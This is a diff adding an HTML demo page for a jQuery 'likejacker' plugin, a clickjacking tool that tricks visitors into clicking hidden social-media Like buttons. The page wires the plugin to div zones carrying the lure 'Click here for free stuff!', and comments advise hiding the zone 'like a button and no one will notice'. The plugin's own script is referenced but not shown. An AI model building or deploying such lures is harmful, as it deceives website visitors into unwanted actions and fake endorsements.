@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Likejacker (jQuery) - Allan Kimmer Jensen</title>
+	<!-- This is for demostration. You only need the javascript! -->
+	<style>
+		body { font-family: arial; width: 60%; margin: 0 auto;}
+		.clickjackZone { height: 100px; width: 250px; margin: 0 20px 20px 0; background: #eee; overflow: hidden; }
+		address { clear: both; margin: -10px 0 10px; }
+	</style>
+</head>
+<body>
+	<h1>jQuery Likejacker</h1>
+	<!-- 
+		Just a link to my twitter!
+	-->
+	<address>
+		By: <a href="http://twitter.com/allankjensen">Allan Kimmer Jensen</a>
+	</address>
+	
+	<!-- 
+		The likejacking will only occur in this field.
+		You can set this to the html or the body element, 
+		but this way you will be able to hide it like a button and no one will notice.
+		
+		It will work on multiple elements.
+	-->
+	<section>
+		<div class="likejackerZone">Click here for free stuff!</div>
+		<div class="likejackerZone"></div>
+	</section>
+
+	
+	<!-- 
+		Include jQuery and the likejacker.js script
+	-->
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+	<script type="text/javascript" src="js/jquery.likehjacker.js"></script>
+	<script type="text/javascript">
+		$(function () {
+			$('.likejackerZone').likejacker({
+				target: 'http://example.com',
+				test: true
+			});
+		});
+	</script>
+
+</body>
+</html>
